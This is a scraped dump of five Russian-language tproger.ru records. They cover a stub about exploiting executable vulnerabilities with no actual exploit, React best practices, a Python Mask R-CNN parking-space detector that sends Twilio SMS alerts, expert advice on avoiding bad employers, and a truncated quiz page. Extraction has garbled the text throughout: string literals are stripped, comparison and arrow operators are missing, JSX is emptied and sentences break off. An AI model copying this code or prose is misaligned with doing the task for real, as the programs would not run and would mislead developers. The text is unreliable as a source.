eafcf8de-32eb-11e9-9b69-28c2dd5a952f	Эксплуатация уязвимостей исполняемых файлов для новичков: привилегии и обработка исключений	Безопасность	В предыдущем материале мы рассмотрели эксплуатацию уязвимости переполнения буфера стека. В этой статье продолжим знакомство с уязвимостями исполняемых файлов на примере обработки исключений и привилегий.ТеорияЧем больше вы пытаетесь разобраться в том, как работают компьютеры, тем чаще вы слышите термины \nchar * stackvar = \nreaduserinput (inputvar);\nprintf(\nСначала мы задаём две переменные строкового типа Варвара Николаева Безопасность	https://tproger.ru/translations/stack-protection-bypass/	107
eb18b984-32eb-11e9-9b69-28c2dd5a952f	React: практики, которые помогут стать продвинутым разработчиком	React; ReactJS; Веб-разработка; Для продолжающих	React.js \n\nfunction ListItem({ item }) {\n  return (\n    \n      \n      \n    \n  );\n}\n\nfunction Glossary(props) {\n  return (\n    \n      {props.items.map(item = (\n        \n      ))}\n    \n  );\n}Больше информации можно найти в документации по фрагментам.Пользуйтесь контекстом чащеБлагодаря контексту можно передавать данные через дерево компонентов, вместо того чтобы вручную передавать свойства на каждом уровне. Поэтому если у вас есть несколько компонентов, которым нужны данные, используйте контекст.Если у вас есть только один дочерний компонент, используйте композицию.Пример установки темы из документации:theme-context.jsexport const themes = {\n  light: {\n    foreground: '#000000',\n    background: '#eeeeee',\n  },\n  dark: {\n    foreground: '#ffffff',\n    background: '#222222',\n  },\n};\nexport const ThemeContext = React.createContext(\n  themes.dark // значениеумолчанию\n);themed-button.jsimport {ThemeContext} from './theme-context';\nclass ThemedButton extends React.Component {\n  render() {\n    let props = this.props;\n    let theme = this.context;\n    return (\n      button\n        {...props}\n        style={{backgroundColor: theme.background}}\n      /\n    );\n  }\n}\nThemedButton.contextType = ThemeContext;\nexport default ThemedButton;app.jsimport {ThemeContext, themes} from './theme-context';\nimport ThemedButton from './themed-button';\n// Промежуточный компонент, который использует ThemedButton\nfunction Toolbar(props) {\n  return (\n    \n      Change Theme\n    \n  );\n}\nclass App extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = {\n      theme: themes.light,\n    };\n this.toggleTheme = () = {\n       this.setState(state = ({\n         theme:\n           state.theme === themes.dark\n             ? themes.light\n             : themes.dark,\n       }));\n     };\n   }\n render() {\n     // Кнопка ThemedButton внутри ThemeProvider\n     // использует тему из state, в то время как внешняя\n     // использует тёмную тему по умолчанию\n     return (\n       \n         \n           \n         \n         \n           \n         \n       \n     );\n   }\n}\nReactDOM.render(Используйте хотя бы одни границы ошибокВ React 16 появилась такая замечательная вещь, как границы ошибок. По названию понятно, что это компоненты, которые отлавливают ошибки во всех дочерних компонентах. Идея очень проста: создайте компонент и используйте его в качестве родителя каждый раз, когда вам понадобится обрабатывать ошибки. Если в каком-то из дочерних компонентов возникнет ошибка, границы ошибок будут вызваны для обработки. Имейте в виду, что границы ошибок отлавливают ошибки отображения. Императивные ошибки вроде тех, что возникают в обработчиках событий, должны отлавливаться try/catch-блоком JavaScript.Для логирования информации об ошибке нужно использовать componentDidCatch():class ErrorBoundary extends React.Component {\n constructor(props) {\n  super(props);\n  this.state = { hasError: false };\n }\n static getDerivedStateFromError(error) {\n     // Обновляем состояние, чтобы следующее отображение\n     // показало интерфейс на случай ошибок\n     return { hasError: true };\n  }\n componentDidCatch(error, info) {\n  // Также можно залогировать ошибку\n  logErrorToMyService(error, info);\n }\n render() {\n     if (this.state.hasError) {\n         // Можно отобразить любой интерфейс на случай ошибок\n         return \n     }\n     return this.props.children; \n } \n}Теперь его можно использовать как обычный компонент:\n  \nвместо него.Разработчики React предоставили инструмент для автоматического изменения кода.Используйте продакшн-сборку в реальной средеНа официальном сайте перечислены конфигурации, которые могут улучшить производительность. Не забудьте ознакомиться с ними перед развёртыванием в проде.Здесь можно почитать руководство.На конфигурацию уйдёт всего 10 минут, а взамен ваше приложение получит большой прирост к производительности.Используйте ссылки ref для взаимодействия с дочерним элементомМы можем использовать ref’ы для активации анимации, выбора текста или управления фокусом. Например, чтобы установить фокус в React, мы можем ссылаться на элементы DOM. С помощью ref’ов мы сначала создаём ссылку на элемент в JSX класса компонента:class CustomTextInput extends React.Component {\n  constructor(props) {\n    super(props);\n    // Создаём ссылку для хранения элемента DOM textInput DOM\n    this.textInput = React.createRef();\n  }\n  render() {\n  // Используем callback ref, чтобы сохранить ссылку на элемент\n  // в поле экземпляра (например, this.textInput).\n    return (\n      input\n        type=\n        ref={this.textInput}\n      /\n    );\n  }\n}При необходимости мы можем установить фокус где угодно в компоненте:focus() {\n  // Явно устанавливаем фокус с помощью DOM API\n  // Примечание:  нужен для получения доступа к узлу DOM\n  this.textInput.current.focus();\n}Подробнее в документации React.Используйте разделение кодаЕсли вы используете CRA (create react app) или Next.js, то у вас уже должен быть готовый конфигурационный файл webpack. Он создаст один файл (бандл), который будет содержать всё ваше приложение. Если вы используете сторонние библиотеки и/или приложение увеличивается в размерах, то и бандл будет становиться больше. Когда пользователь зайдёт на сайт, браузер скачает весь бандл и затем всё отобразит. Это может сильно замедлить сайт, поэтому гораздо лучше разделить код и таким образом разбить бандл на части. В результате браузер будет закачивать нужные части по мере необходимости, что приведёт к улучшению времени загрузки сайта.Для достижения нашей цели можно использовать React.lazy.Примечание React.lazy и Suspense пока нельзя использовать для отображения на стороне сервера. Для решения этой проблемы вы можете воспользоваться React Loadable. В документации можно найти хорошее руководство по разделению бандлов с серверным отображением.Разделять код можно разными способами, но хорошей отправной точкой будет разделение на основе путей.Как правило,\nimport React, { Suspense, lazy } from 'react';\nconst Home = lazy(() =\nconst About = lazy(() =\nconst App = () = (\n  \n    \n      \n        \n        \n      \n    \n  \n);Suspense нужен здесь на всякий случай: он будет показан, если нужный бандл ещё не загрузился. Здесь вы можете использовать индикатор загрузки, чтобы показать пользователям, что процесс не стоит на месте. Вы можете использовать границы ошибок даже в качестве родителя Suspense для обработки других ошибок вроде сетевых.React.lazyНикита Прияцелюк, последний центурион React, ReactJS, Веб-разработка, Для продолжающих	https://tproger.ru/translations/concepts-to-become-an-advanced-react-developer/	107
eb403cca-32eb-11e9-9b69-28c2dd5a952f	Ищем свободное парковочное место с Python и глубоким обучением	Python; Машинное обучение	Рассказывает, которая показывает, какие пиксели внутри ограничивающей рамки являются частью объекта. С помощью данных маски можно найти контур объекта.Ниже показан код на Python для обнаружения ограничивающей рамки для машин с помощью предобученной модели Mask R-CNN и OpenCV:import numpy as np\nimport cv2\nimport mrcnn.config\nimport mrcnn.utils\nfrom mrcnn.model import MaskRCNN\nfrom pathlib import Path\n\n\n# Конфигурация, которую будет использовать библиотека Mask-RCNN.\nclass MaskRCNNConfig(mrcnn.config.Config):\n    NAME = \n    IMAGES_PER_GPU = 1\n    GPU_COUNT = 1\n    NUM_CLASSES = 1 + 80  # в датасете COCO находится 80 классов + 1 фоновый класс.\n    DETECTION_MIN_CONFIDENCE = 0.6\n\n\n# Фильтруем список результатов распознавания, чтобы остались только автомобили.\ndef get_car_boxes(boxes, class_ids):\n    car_boxes = []\n\n    for i, box in enumerate(boxes):\n        # Если найденный объект не автомобиль, то пропускаем его.\n        if class_ids[i] in [3, 8, 6]:\n            car_boxes.append(box)\n\n    return np.array(car_boxes)\n\n\n# Корневая директория проекта.\nROOT_DIR = Path()\n\n# Директория для сохранения логов и обученной модели.\nMODEL_DIR = ROOT_DIR / \n\n# Локальный путь к файлу с обученными весами.\nCOCO_MODEL_PATH = ROOT_DIR / \n\n# Загружаем датасет COCO при необходимости.\nif not COCO_MODEL_PATH.exists():\n    mrcnn.utils.download_trained_weights(COCO_MODEL_PATH)\n\n# Директория с изображениями для обработки.\nIMAGE_DIR = ROOT_DIR / \n\n# Видеофайл или камера для обработки  вставьте значение 0, если нужно использовать камеру, а не видеофайл.\nVIDEO_SOURCE = \n\n# Создаём модель Mask-RCNN в режиме вывода.\nmodel = MaskRCNN(mode=, model_dir=MODEL_DIR, config=MaskRCNNConfig())\n\n# Загружаем предобученную модель.\nmodel.load_weights(COCO_MODEL_PATH, by_name=True)\n\n# Местоположение парковочных мест.\nparked_car_boxes = None\n\n# Загружаем видеофайл, для которого хотим запустить распознавание.\nvideo_capture = cv2.VideoCapture(VIDEO_SOURCE)\n\n# Проходимся в цикле по каждому кадру.\nwhile video_capture.isOpened():\n    success, frame = video_capture.read()\n    if not success:\n        break\n\n    # Конвертируем изображение из цветовой модели BGR (используется OpenCV) в RGB.\n    rgb_image = frame[:, :, ::-1]\n\n    # Подаём изображение модели Mask R-CNN для получения результата.\n    results = model.detect([rgb_image], verbose=0)\n\n    # Mask R-CNN предполагает, что мы распознаём объекты на множественных изображениях.\n    # Мы передали только одно изображение, поэтому извлекаем только первый результат.\n    r = results[0]\n\n    # Переменная r теперь содержит результаты распознавания:\n    # - r['rois'] \n    # - r['class_ids'] \n    # - r['scores'] \n    # - r['masks']  маски объектов (что даёт вам их контур).\n\n    # Фильтруем результат для получения рамок автомобилей.\n    car_boxes = get_car_boxes(r['rois'], r['class_ids'])\n\n    print()\n\n    # Отображаем каждую рамку на кадре.\n    for box in car_boxes:\n        print(, box)\n\n        y1, x1, y2, x2 = box\n\n        # Рисуем рамку.\n        cv2.rectangle(frame, (x1, y1), (x2, y2), (0, 255, 0), 1)\n\n    # Показываем кадр на экране.\n    cv2.imshow('Video', frame)\n\n    # Нажмите 'q', чтобы выйти.\n    if cv2.waitKey(1)  0xFF == ord('q'):\n        break\n\n# Очищаем всё после завершения.\nvideo_capture.release()\ncv2.destroyAllWindows()После запуска этого скрипта на экране появится изображение с рамкой вокруг каждой обнаруженной машины:Также в консоль будут выведены координаты каждой машины:Cars found in frame of video:\nCar: [492 871 551 961]\nCar: [450 819 509 913]\nCar: [411 774 470 856]Вот мы и научились распознавать машины на изображении.Распознаём пустые парковочные местаМы знаем пиксельные координаты каждой машины. Просматривая несколько последовательных кадров, мы легко можем определить, какие из машин не двигались, и предположить, что там находятся парковочные места. рамки.Мы воспользуемся мерой под названием Intersection Over Union (отношение площади пересечения к сумме площадей) или IoU. IoU можно найти, посчитав количество пикселей, где пересекаются два объекта, и разделить на количество пикселей, занимаемых этими объектами:Так мы сможем понять, как сильно ограничивающая рамка машины пересекается с рамкой парковочного места. Это позволит легко определить, свободна ли парковка. Если значение IoU низкое, вроде 0.15, значит, машина занимает малую часть парковочного места. А если оно высокое, вроде 0.6, то это значит, что машина занимает большую часть места и там нельзя припарковаться.Поскольку IoU используется довольно часто в компьютерном зрении, в соответствующих библиотеках с большой вероятностью есть реализация этой меры. В нашей библиотеке Mask R-CNN она реализована в виде функции mrcnn.utils.compute_overlaps().Если у нас есть список ограничивающих рамок для парковочных мест, то добавить проверку на наличие машин в этих рамках можно, добавив всего строку-другую кода:    # Фильтруем результат для получения рамок автомобилей.\n    car_boxes = get_car_boxes(r['rois'], r['class_ids'])\n\n    # Смотрим, как сильно машины пересекаются с известными парковочными местами.\n    overlaps = mrcnn.utils.compute_overlaps(car_boxes, parking_areas)\n\n    print(overlaps)Результат должен выглядеть примерно так:В этом двумерном массиве каждая строка отражает одну рамку парковочного места. А каждый столбец говорит о том, насколько сильно каждое из мест пересекается с одной из обнаруженных машин. Результат 1.0 означает, что всё место полностью занято машиной, а низкое значение вроде 0.02 говорит о том, что машина немного влезла на место, но на нём ещё можно припарковаться.Чтобы найти незанятые места, нужно всего лишь проверить каждую строку в этом массиве. Если все числа близки к нулю, то скорее всего место свободно!Однако имейте в виду, что распознавание объектов не всегда работает идеально с видео в реальном времени. Хоть модель на основе Mask R-CNN довольно точна, время от времени она может пропустить машину-другую в одном кадре видео. Поэтому прежде чем утверждать, что место свободно, нужно убедиться, что оно остаётся таким ещё на протяжении 5 это популярный API, который позволяет отправлять SMS из практически любого языка программирования с помощью всего нескольких строк кода. Конечно, если вы предпочитаете другой сервис, то можете использовать и его. Я никак не связан с Twilio, просто это первое, что приходит на ум.Чтобы использовать Twilio, зарегистрируйте пробный аккаунт, создайте номер телефона Twilio и получите аутентификационные данные аккаунта. Затем установите клиентскую библиотеку:$ pip3 install twilioПосле этого используйте следующий код для отправки сообщения:from twilio.rest import Client\n\n# Данные аккаунта Twilio.\ntwilio_account_sid = 'Ваш Twilio SID'\ntwilio_auth_token = 'Ваш токен аутентификации Twilio'\ntwilio_source_phone_number = 'Ваш номер телефона Twilio'\n\n# Создаём объект клиента Twilio.\nclient = Client(twilio_account_sid, twilio_auth_token)\n\n# Отправляем SMS.\nmessage = client.messages.create(\n    body=,\n    from_=twilio_source_phone_number,\n    to=\n)Чтобы добавить возможность отправки сообщений в наш скрипт, просто скопируйте туда этот код. Однако нужно сделать так, чтобы сообщение не отправлялось на каждом кадре, где видно свободное место. Поэтому у нас будет флаг, который в установленном состоянии не даст отправлять сообщения в течение какого-то времени или пока не освободится другое место.Складываем всё воединоimport numpy as np\nimport cv2\nimport mrcnn.config\nimport mrcnn.utils\nfrom mrcnn.model import MaskRCNN\nfrom pathlib import Path\nfrom twilio.rest import Client\n\n\n# Конфигурация, которую будет использовать библиотека Mask-RCNN.\nclass MaskRCNNConfig(mrcnn.config.Config):\n    NAME = \n    IMAGES_PER_GPU = 1\n    GPU_COUNT = 1\n    NUM_CLASSES = 1 + 80  # в датасете COCO находится 80 классов + 1 фоновый класс.\n    DETECTION_MIN_CONFIDENCE = 0.6\n\n\n# Фильтруем список результатов распознавания, чтобы остались только автомобили.\ndef get_car_boxes(boxes, class_ids):\n    car_boxes = []\n\n    for i, box in enumerate(boxes):\n        # Если найденный объект не автомобиль, то пропускаем его.\n        if class_ids[i] in [3, 8, 6]:\n            car_boxes.append(box)\n\n    return np.array(car_boxes)\n\n\n# Конфигурация Twilio.\ntwilio_account_sid = 'Ваш Twilio SID'\ntwilio_auth_token = 'Ваш токен аутентификации Twilio'\ntwilio_phone_number = 'Ваш номер телефона Twilio'\ndestination_phone_number = 'Номер, куда придёт сообщение'\nclient = Client(twilio_account_sid, twilio_auth_token)\n\n\n# Корневая директория проекта.\nROOT_DIR = Path()\n\n# Директория для сохранения логов и обученной модели.\nMODEL_DIR = ROOT_DIR / \n\n# Локальный путь к файлу с обученными весами.\nCOCO_MODEL_PATH = ROOT_DIR / \n\n# Загружаем датасет COCO при необходимости.\nif not COCO_MODEL_PATH.exists():\n    mrcnn.utils.download_trained_weights(COCO_MODEL_PATH)\n\n# Директория с изображениями для обработки.\nIMAGE_DIR = ROOT_DIR / \n\n# Видеофайл или камера для обработки  вставьте значение 0, если использовать камеру, а не видеофайл.\nVIDEO_SOURCE = \n\n# Создаём модель Mask-RCNN в режиме вывода.\nmodel = MaskRCNN(mode=, model_dir=MODEL_DIR, config=MaskRCNNConfig())\n\n# Загружаем предобученную модель.\nmodel.load_weights(COCO_MODEL_PATH, by_name=True)\n\n# Местоположение парковочных мест.\nparked_car_boxes = None\n\n# Загружаем видеофайл, для которого хотим запустить распознавание.\nvideo_capture = cv2.VideoCapture(VIDEO_SOURCE)\n\n# Сколько кадров подряд с пустым местом мы уже видели.\nfree_space_frames = 0\n\n# Мы уже отправляли SMS?\nsms_sent = False\n\n# Проходимся в цикле по каждому кадру.\nwhile video_capture.isOpened():\n    success, frame = video_capture.read()\n    if not success:\n        break\n\n    # Конвертируем изображение из цветовой модели BGR в RGB.\n    rgb_image = frame[:, :, ::-1]\n\n    # Подаём изображение модели Mask R-CNN для получения результата.\n    results = model.detect([rgb_image], verbose=0)\n\n    # Mask R-CNN предполагает, что мы распознаём объекты на множественных изображениях.\n    # Мы передали только одно изображение, поэтому извлекаем только первый результат.\n    r = results[0]\n\n    # Переменная r теперь содержит результаты распознавания:\n    # - r['rois'] \n    # - r['class_ids'] \n    # - r['scores'] \n    # - r['masks']  маски объектов (что даёт вам их контур).\n\n    if parked_car_boxes is None:\n        # Это первый кадр видео  допустим, что все обнаруженные машины стоят на парковке.\n        # Сохраняем местоположение каждой машины как парковочное место и переходим к следующему кадру.\n        parked_car_boxes = get_car_boxes(r['rois'], r['class_ids'])\n    else:\n        # Мы уже знаем, где места. Проверяем, есть ли свободные.\n\n        # Ищем машины на текущем кадре.\n        car_boxes = get_car_boxes(r['rois'], r['class_ids'])\n\n        # Смотрим, как сильно эти машины пересекаются с известными парковочными местами.\n        overlaps = mrcnn.utils.compute_overlaps(parked_car_boxes, car_boxes)\n\n        # Предполагаем, что свободных мест нет, пока не найдём хотя бы одно.\n        free_space = False\n\n        # Проходимся в цикле по каждому известному парковочному месту.\n        for parking_area, overlap_areas in zip(parked_car_boxes, overlaps):\n\n            # Ищем максимальное значение пересечения с любой обнаруженной\n            # на кадре машиной (неважно, какой).\n            max_IoU_overlap = np.max(overlap_areas)\n\n            # Получаем верхнюю левую и нижнюю правую координаты парковочного места.\n            y1, x1, y2, x2 = parking_area\n\n            # Проверяем, свободно ли место, проверив значение IoU.\n            if max_IoU_overlap  0.15:\n                # Место свободно! Рисуем зелёную рамку вокруг него.\n                cv2.rectangle(frame, (x1, y1), (x2, y2), (0, 255, 0), 3)\n                # Отмечаем, что мы нашли как минимум оно свободное место.\n                free_space = True\n            else:\n                # Место всё ещё занято  рисуем красную рамку.\n                cv2.rectangle(frame, (x1, y1), (x2, y2), (0, 0, 255), 1)\n\n            # Записываем значение IoU внутри рамки.\n            font = cv2.FONT_HERSHEY_DUPLEX\n            cv2.putText(frame, f, (x1 + 6, y2 - 6), font, 0.3, (255, 255, 255))\n\n        # Если хотя бы одно место было свободным, начинаем считать кадры.\n        # Это для того, чтобы убедиться, что место действительно свободно\n        # и не отправить лишний раз уведомление.\n        if free_space:\n            free_space_frames += 1\n        else:\n            # Если всё занято, обнуляем счётчик.\n            free_space_frames = 0\n\n        # Если место свободно на протяжении нескольких кадров, можно сказать, что оно свободно.\n        if free_space_frames  10:\n            # Отображаем надпись SPACE AVAILABLE!! вверху экрана.\n            font = cv2.FONT_HERSHEY_DUPLEX\n            cv2.putText(frame, f, (10, 150), font, 3.0, (0, 255, 0), 2, cv2.FILLED)\n\n            # Отправляем сообщение, если ещё не сделали это.\n            if not sms_sent:\n                print()\n                message = client.messages.create(\n                    body=,\n                    from_=twilio_phone_number,\n                    to=destination_phone_number\n                )\n                sms_sent = True\n\n        # Показываем кадр на экране.\n        cv2.imshow('Video', frame)\n\n    # Нажмите 'q', чтобы выйти.\n    if cv2.waitKey(1)  0xFF == ord('q'):\n        break\n\n# Нажмите 'q', чтобы выйти.\nvideo_capture.release()\ncv2.destroyAllWindows()Для запуска того кода сначала нужно установить Python 3.6+, Matterport Mask R-CNN и OpenCV.Я намеренно писал код как можно проще. Например, если он видит на первом кадре машины, то делает вывод, что все они припаркованы. Попробуйте поэкспериментировать с ним и посмотрите, получится ли у вас повысить его надёжность.Просто изменив идентификаторы объектов, которые ищет модель, вы можете превратить код в нечто совершенно иное. Например, представьте, что вы работаете на горнолыжном курорте. Внеся пару изменений, вы можете превратить этот скрипт в систему, которая автоматически распознаёт сноубордистов, спрыгивающих с рампы, и записывает ролики с классными прыжками. Или, если вы работаете в заповеднике, вы можете создать систему, которая считает зебр. Вы ограничены лишь своим воображением. Экспериментируйте!А что бы вы хотели распознавать и отслеживать? Паркоместо Место в маршрутке Свежие статьи на Tproger Новые мемы в /dev/null Комаров или посмотреть результаты Загрузка ...Перевод статьи Никита Прияцелюк, последний центурион Python, Машинное обучение	https://tproger.ru/translations/parking-searching/	107
eb58bdcc-32eb-11e9-9b69-28c2dd5a952f	Как быстро понять, куда не стоит устраиваться на работу  отвечают эксперты	Собеседование; Советы	Во многих компаниях существует испытательный срок  на собеседовании или, что ещё лучше, по вакансии, чтобы не тратить своё время зря? По каким признакам это можно сделать? Узнаем у экспертов, а в конце выделим главные.\n\n\n\n\nВасилий Воропаев, CEO RubrainЕсли вакансия написана с ошибками или в ней ищут шаблонного супергероя , поскольку это означает, что от программиста ждут не только кода, но и желания задерживаться до ночи и вообще ненормированного графика и корпоративов/тренингов в нерабочее время.В любом случае перед откликом на вакансию стоит посмотреть соцсети компании и особенно её руководителей и вашего непосредственного руководителя. Если что-то настораживает, а работа предполагается в офисе, то, возможно, не стоит связываться. Стоит собрать информацию о компании в интернете и спросить мнение знакомых, которые, возможно работали в ней или знают внутреннюю кухню опосредованно.Важно выяснить вопрос с оплатой труда. Если по какой-то причине, работодатель не предлагает сразу официальное трудоустройство, а у вас есть сомнения в его честности, можно начать работать в конце месяца. В этом случае, если сомнения оправдаются, вы потеряете максимум недельную зарплату.Если вам долго не отвечают на резюме или сопроводительное письмо, то и все вопросы будут долго согласовывать.215\nОтвет эксперта\n2019-01-23T11:56:12+00:00\n\nРейтинг полезности ответа: 215\nПовысить\nПонизить\n\n\n\nКсения Степанян, старший менеджер по подбору персонала в  это квартальные премии, которые зависят от результатов, но при этом в компании не могут чётко обозначить, какими эти результаты должны быть, и тем более не готовы их фиксировать в договоре.124\nОтвет эксперта\n2019-01-23T11:56:12+00:00\n\nРейтинг полезности ответа: 124\nПовысить\nПонизить\n\n\n\nНаталья Волкова, HR-менеджер компании DIRECTUMНепрозрачные условия работы: низкий оклад и ориентация только на проценты от деятельности (нет уверенности, что на них можно выйти).Некомпетентные специалисты, с которым идёт общение (HR и руководство).Некорректное поведение работодателя на встрече: быстрое собеседование с поверхностной оценкой кандидата.Неофициальное трудоустройство, полностью чёрная зарплата, сомнительное расположение офиса (в гараже, в неудачных районах).Нет возможности ознакомиться с договором до трудоустройства (если официальное).Наличие системы штрафов для сотрудников.125\nОтвет эксперта\n2019-01-23T11:56:12+00:00\n\nРейтинг полезности ответа: 125\nПовысить\nПонизить\n\n\n\nЕкатерина Гаврилова, основатель и генеральный директор IT-рекрутингового агентства DigitalHRБудьте бдительны в случае, если компания-работодатель просит закончить общение с агентством (сказать, что не хотите больше рассматривать вакансию) и вести коммуникацию с ними напрямую. Подобным образом компания хочет уйти от обязательств по договору и не платить вознаграждение агентству  не бойтесь задавать вопросы, если вас что-то смущает! Лучше уточните в телефонном разговоре, сколько открыта вакансия, в связи с чем и какого сотрудника ищут в команду.7\nОтвет эксперта\n2019-01-23T11:56:12+00:00\n\nРейтинг полезности ответа: 7\nПовысить\nПонизить\n\n\n\nНаталья Сторожева, генеральный директор Центра развития бизнеса и карьеры . В этом случае задача руководителя: увлечь вас проектом. Но когда говорят про идею, о деньгах забывают.И, конечно, стоит ознакомиться с негативными отзывами о компании и руководителе в соцсетях и на сайтах отзывов.112\nОтвет эксперта\n2019-01-23T11:56:12+00:00\n\nРейтинг полезности ответа: 112\nПовысить\nПонизить\n\n\n\nДарья Рудник, директор по персоналу компании  это плохой знак.Непонятное финансирование. Здорово, когда друг приглашает вас в стартап. Но, если вы не понимаете, откуда у этого стартапа деньги на развитие, то вместо работы в Facebook’е через 10 лет, вы через два месяца можете оказаться на улице.90\nОтвет эксперта\n2019-01-23T11:56:12+00:00\n\nРейтинг полезности ответа: 90\nПовысить\nПонизить\n\n\n\nРезида Рашитова, HR-менеджер компании DIRECTUMО работодателе трудно найти информацию в интернете, а социальные сети, если и есть, то не ведутся очень давно.Вы до конца не понимаете, чем занимается компания и какие у неё конкурентные преимущества на рынке. На собеседовании неконкретно и общими словами рассказывают о стабильности компании и её перспективах.До конца не ясно, как будет рассчитываться заработная плата.HR не может ответить на неудобные вопросы о текучке и задержках по заработной плате.А ещё проще понять добросовестность работодателя можно задав себе вопрос: .41\nОтвет эксперта\n2019-01-23T11:56:12+00:00\n\nРейтинг полезности ответа: 41\nПовысить\nПонизитьИтак, как понять, куда не стоит устраиваться на работу?\nНа неудобные вопросы вам дают ответ без конкретики или вовсе не дают.Расплывчатые должностные обязанности.Обещание оформить договор  и невозможность ознакомиться с ним до трудоустройства.Негативные отзывы в соцсетях и на специализированных ресурсах.В интернете сложно найти информацию о компании.100500\nЛучший ответ\n2019-01-23T11:56:12+00:00\nTproger.ruНапоминаем, что вырасскажем, как это сделать. Собеседование, Советы	https://tproger.ru/experts/avoid-bad-employer/	107
eb79e506-32eb-11e9-9b69-28c2dd5a952f	Огурцы, утечки и успехи ИИ насколько вы прошарены в трендах? Проверьте себя		В мире IT происходит много важного  вспомните хотя бы блокировку Telegram и сделку между Microsoft и GitHub. Из-за чего Линус самоотстранился от разработки ядра Linux и какая IT-компания лучше всех выращивает огурцы? Проверьте на примере ярких новостей прошлого года, насколько вы прошарены!\n\n\n setTimeout(function(){quiz_dont_load.style.display='block';quiz_dont_load.innerHTML='Скоро загрузится, клянусь своей IDE!';},5*1000);setTimeout(function(){quiz_dont_load.style.display='block';quiz_dont_load.innerHTML='Ещё совсем немножко, прям милипусенько...';},10*1000);setTimeout(function(){quiz_dont_load.style.display='block';quiz_dont_load.innerHTML='Викторина загружается дольше, чем обычно: попробуйте потанцевать с бубном — отключить AdBlock и перезагрузить страницу :(';},20*1000); \nНачать тест var quiz_data_stringify="eyJuYW1lIjoiXHUwNDEyXHUwNDM4XHUwNDNhXHUwNDQyXHUwNDNlXHUwNDQwXHUwNDM4XHUwNDNkXHUwNDMwIFx1MDQzZlx1MDQzZSBcdTA0NDFcdTA0M2VcdTA0MzFcdTA0NGJcdTA0NDJcdTA0MzhcdTA0NGZcdTA0M2MgMjAxOCBcdTA0MzNcdTA0M2VcdTA0MzRcdTA0MzAiLCJpZCI6IjY0Iiwic2hvcnRfcmVzdWx0IjoiMCIsInJhbmRvbWl6ZSI6IjEiLCJyYW5kb21pemVfbGltaXQiOiIxMCIsImNvZGVfbW9kZSI6IjAiLCJzaG93X2VtYWlsX2Zvcm0iOiIwIiwic2hvd19lbWFpbF9mb3JtX21pbl9yZXMiOiIwIiwicXVpel9jb21wYW55X2lkIjoiIiwicXVpel9qb2JfaWQiOiIiLCJxdWl6X2pvYl91cmwiOiIiLCJleHRyYV9zaGFyZV90ZXh0IjoiIiwicmVzdWx0IjpbeyJ0aXRsZSI6Ilx1MDQxZlx1MDQ0MFx1MDQzZVx1MDQ0OFx1MDQzMFx1MDQ0MFx1MDQzYVx1MDQzMCBSYXJlIiwiZGVzYyI6IjxkaXYgYWxpZ249XCJjZW50ZXJcIiBzdHlsZT1cIm1hcmdpbi1ib3R0b206IDIwcHg7XCI+PGltZyBzcmM9XCJodHRwczpcL1wvY2RuLnRwcm9nZXIucnVcL3dwLWNvbnRlbnRcL3VwbG9hZHNcLzIwMTlcLzAxXC9yYXJlMS5qcGdcIj48XC9kaXY+XHJcblxyXG5cdTA0MjFcdTA0M2VcdTA0MzJcdTA0NDFcdTA0MzVcdTA0M2MgXHUwNDNkXHUwNDM1IFx1MDQzZlx1MDQ0MFx1MDQzZVx1MDQ0OFx1MDQzMFx1MDQ0MFx1MDQzNVx1MDQzZFx1MDQ0YiBcdTIwMTQgXHUwNDM3XHUwNDMwIFx1MDQzZFx1MDQzZVx1MDQzMlx1MDQzZVx1MDQ0MVx1MDQ0Mlx1MDQ0Zlx1MDQzY1x1MDQzOCwgXHUwNDNmXHUwNDNlXHUwNDQ1XHUwNDNlXHUwNDM2XHUwNDM1LCBcdTA0M2RcdTA0MzUgXHUwNDQxXHUwNDNiXHUwNDM1XHUwNDM0XHUwNDM4XHUwNDQyXHUwNDM1LiBcdTA0MjdcdTA0MzhcdTA0NDJcdTA0MzBcdTA0MzlcdTA0NDJcdTA0MzUgXHUwNDNkXHUwNDMwXHUwNDQ4XHUwNDQzIDxhIGhyZWY9XCJodHRwczpcL1wvdHByb2dlci5ydVwvbmV3c2xldHRlclwvXCIgdGFyZ2V0PVwiX2JsYW5rXCI+XHUwNDQwXHUwNDMwXHUwNDQxXHUwNDQxXHUwNDRiXHUwNDNiXHUwNDNhXHUwNDQzIFx1MDBhYlx1MDQxMFx1MDQ0MFx1MDQzM1x1MDQ0M1x1MDQzY1x1MDQzNVx1MDQzZFx1MDQ0Mlx1MDQ0YiBcdTA0MzggXHUwNDQ0XHUwNDQzXHUwNDNkXHUwNDNhXHUwNDQ2XHUwNDM4XHUwNDM4XHUwMGJiPFwvYT4gXHUwNDM4IFx1MDQzMVx1MDQ0M1x1MDQzNFx1MDQ0Y1x1MDQ0Mlx1MDQzNSBcdTA0MzIgXHUwNDNhXHUwNDQzXHUwNDQwXHUwNDQxXHUwNDM1ISJ9LHsidGl0bGUiOiJcdTA0MWZcdTA0NDBcdTA0M2VcdTA0NDhcdTA0MzBcdTA0NDBcdTA0M2FcdTA0MzAgUmFyZSIsImRlc2MiOiI8ZGl2IGFsaWduPVwiY2VudGVyXCIgc3R5bGU9XCJtYXJnaW4tYm90dG9tOiAyMHB4O1wiPjxpbWcgc3JjPVwiaHR0cHM6XC9cL2Nkbi50cHJvZ2VyLnJ1XC93cC1jb250ZW50XC91cGxvYWRzXC8yMDE5XC8wMVwvcmFyZTEuanBnXCI+PFwvZGl2PlxyXG5cclxuXHUwNDIxXHUwNDNlXHUwNDMyXHUwNDQxXHUwNDM1XHUwNDNjIFx1MDQzZFx1MDQzNSBcdTA0M2ZcdTA0NDBcdTA0M2VcdTA0NDhcdTA0MzBcdTA0NDBcdTA0MzVcdTA0M2RcdTA0NGIgXHUyMDE0IFx1MDQzN1x1MDQzMCBcdTA0M2RcdTA0M2VcdTA0MzJcdTA0M2VcdTA0NDFcdTA0NDJcdTA0NGZcdTA0M2NcdTA0MzgsIFx1MDQzZlx1MDQzZVx1MDQ0NVx1MDQzZVx1MDQzNlx1MDQzNSwgXHUwNDNkXHUwNDM1IFx1MDQ0MVx1MDQzYlx1MDQzNVx1MDQzNFx1MDQzOFx1MDQ0Mlx1MDQzNS4gXHUwNDI3XHUwNDM4XHUwNDQyXHUwNDMwXHUwNDM5XHUwNDQyXHUwNDM1IFx1MDQzZFx1MDQzMFx1MDQ0OFx1MDQ0MyA8YSBocmVmPVwiaHR0cHM6XC9cL3Rwcm9nZXIucnVcL25ld3NsZXR0ZXJcL1wiIHRhcmdldD1cIl9ibGFua1wiPlx1MDQ0MFx1MDQzMFx1MDQ